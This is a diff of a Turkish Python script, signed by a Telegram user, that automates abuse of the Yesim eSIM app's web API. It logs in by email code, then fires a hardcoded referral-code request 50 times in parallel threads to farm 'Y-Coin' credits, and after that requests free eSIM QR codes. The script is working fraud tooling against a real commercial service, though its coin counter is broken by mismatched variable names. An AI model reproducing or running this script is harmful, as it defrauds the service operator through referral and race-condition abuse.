@@ -1,90 +1,96 @@
 import requests
-import json, sys, time
+import threading
+import queue
 
+M = "\033[34m"
+Y = "\033[32m"
+R = "\033[31m"
 
-print("  _____             _      ______                ")
-print(" |  __ \           | |    |  ____|               ")
-print(" | |  | | __ _ _ __| | __ | |__   _ __  ______ _ ")
-print(" | |  | |/ _` | '__| |/ / |  __| | '_ \|_  / _` |")
-print(" | |__| | (_| | |  |   <  | |____| | | |/ / (_| |")
-print(" |_____/ \__,_|_|  |_|\_\ |______|_| |_/___\__,_|")
-print("                                   TG: @dark_enza")
-print("---Birkaç hızlı hareket  yavaşlatır gençliğini---")
+print(M+"  _____             _      ______                "+M)
+print(M+" |  __ \           | |    |  ____|               "+M)
+print(M+" | |  | | __ _ _ __| | __ | |__   _ __  ______ _ "+M)
+print(M+" | |  | |/ _` | '__| |/ / |  __| | '_ \|_  / _` |"+M)
+print(M+" | |__| | (_| | |  |   <  | |____| | | |/ / (_| |"+M)
+print(M+" |_____/ \__,_|_|  |_|\_\ |______|_| |_/_/ \__,_|"+M)
+print(R+"                         Code By -> TG: dark_enza"+R)
 print("")
-eposta = input("Eposta gir : ")
-def havali(parametre, time_sleep = 0.04):
-    soz=[]
-    for i in parametre+"\n":
-        soz.append(i)
-        time.sleep(time_sleep)
-        sys.stdout.write(str(soz[0]))
-        sys.stdout.flush()
-        soz.remove(i)
+print(Y+" Yesim Y-Coin Creator"+Y)
+print(R+" Telegram Kanalım : @dwstoree"+R)
+print("")
+eposta = input(M+"Eposta gir: "+M)
 
-
-def bekle():
-    say = 0
-    karakter = ["\\", "|", "/", "-"]
-
-    while True:
-        if say == 11: break
-
-
-        for i in range(0, 4):
-            sys.stdout.write('---- KOD GÖNDERİLİYOR ----' +karakter[i]+" \r")
-            sys.stdout.flush()
-            time.sleep(0.1)
-        say += 1
-
-
-
-yazi1=('----- KOD GÖNDERİLDİ ----')
-if __name__ == "__main__":
-    bekle()
-    havali(yazi1, 0.05)
-    time.sleep(1)
-    
-
-#-------------------- Kod GÖnderme --------------------#
-url1="https://iweb.yesim.app//v1/auth_email?email="+eposta+"&version=4.0.8&lang=en&platform=3"
-headers1={
-        'Host': 'iweb.yesim.app'
-                        }
-res1=requests.post(url1,headers=headers1)
-sonuc1=res1.json()
-
-#------------------- Kod Onaylama session id çekme ---------------#
-kod= input("Kodu Gir: ")
-url2="https://iweb.yesim.app/v1/auth_code?code="+kod+"&email="+eposta+"&version=4.0.8&lang=en&platform=3"
-headers2={
+# -------------------- Kod GÖnderme --------------------#
+url1 = "https://iweb.yesim.app//v1/auth_email?email=" + eposta + "&version=4.0.8&lang=en&platform=3"
+headers1 = {
     'Host': 'iweb.yesim.app'
 }
-res2=requests.post(url2,headers=headers2)
-sonuc2=res2.json()["sessionId"]
+res1 = requests.post(url1, headers=headers1)
+sonuc1 = res1.json()
 
-#------------- Y Coin Çekme -----------#
-url3="https://iweb.yesim.app/v1/code_apply?ref_code&web_key="+sonuc2+"&ref_code=NQVO420&lang=en"
-headers3={
+# ------------------- Kod Onaylama session id çekme ---------------#
+kod = input("Kodu Gir: ")
+url2 = "https://iweb.yesim.app/v1/auth_code?code=" + kod + "&email=" + eposta + "&version=4.0.8&lang=en&platform=3"
+headers2 = {
     'Host': 'iweb.yesim.app'
 }
-res3=requests.get(url3,headers=headers3)
-sonuc3=res3.json()
-#-------------- Esim Almak ------------#
+res2 = requests.post(url2, headers=headers2)
+sonuc2 = res2.json()["sessionId"]
+
+# ------------- Y Coin Çekme -----------#
+url3 = "https://iweb.yesim.app/v1/code_apply?ref_code&web_key=" + sonuc2 + "&ref_code=UMVM790&lang=en"
+headers3 = {
+    'Host': 'iweb.yesim.app'
+}
+
+def make_request(url, headers):
+    res = requests.get(url, headers=headers)
+    return res.json()
+
+count = 50 
+sira = queue.Queue()
+for i in range(count):
+    sira.put((url3, headers3))
+
+toplam_y_coin = 0
+
+def basla(sira):
+    global total_y_coin
+    while not sira.empty():
+        url, headers = sira.get()
+        try:
+            res = make_request(url, headers)
+            if res == ['success']:
+                toplam_y_coin += 200
+                print(Y+"+200 Y-Coin Eklendi/Added"+Y)
+                print("")
+                print("---" * 10)
+            sira.task_done()
+        except Exception as e:
+            print(R+"İstek başarısız oldu:"+R, str(e))
+
+for i in range(count):
+    t = threading.Thread(target=basla, args=(sira,))
+    t.start()
+
+sira.join()
+print("Toplam Alınan Y-Coin:", total_y_coin)
+# -------------- Esim Almak ------------#
 
 try:
-	dark=requests.get("https://iweb.yesim.app/v1/activate_pay_as_you_go?web_key="+sonuc2+"&lang=en", timeout=5)
-	sonuc4=dark.json()=="OK"
-	print("KareKod İstendi")
+    dark = requests.get("https://iweb.yesim.app/v1/activate_pay_as_you_go?web_key="+sonuc2+"&lang=en", timeout=5)
+    sonuc4 = dark.json() == "OK"
+    print(Y+"KareKod İstendi"+Y)
 except requests.exceptions.Timeout:
-	print("KareKod Oluşturulamadı.")
-	raise SystemExit()
+    print(R+"KareKod Oluşturulamadı."+R)
+    raise SystemExit()
+
 print("")
+
 try:
-	dark1=requests.get("https://iweb.yesim.app/v1/show_my_qrs?web_key="+sonuc2+"&lang=en", timeout=5)
-	sonuc5=dark1.json()["Qrs"]
-	print("KareKod Epostaya Gönderildi")
+    dark1 = requests.get("https://iweb.yesim.app/v1/show_my_qrs?web_key=" + sonuc2 + "&lang=en", timeout=5)
+    sonuc5 = dark1.json()["Qrs"]
+    print(Y+"KareKod Epostaya Gönderildi"+Y)
 except:
-	print("KareKod Oluşturulamadı")
-	
-havali("Bol Sömürmeler Ben DARK_ENZA")
-havali("Telegram @dark_enza / TG Kanalı @dwstoree")
+    print(R+"KareKod Oluşturulamadı"+R)
+    raise SystemExit()
+
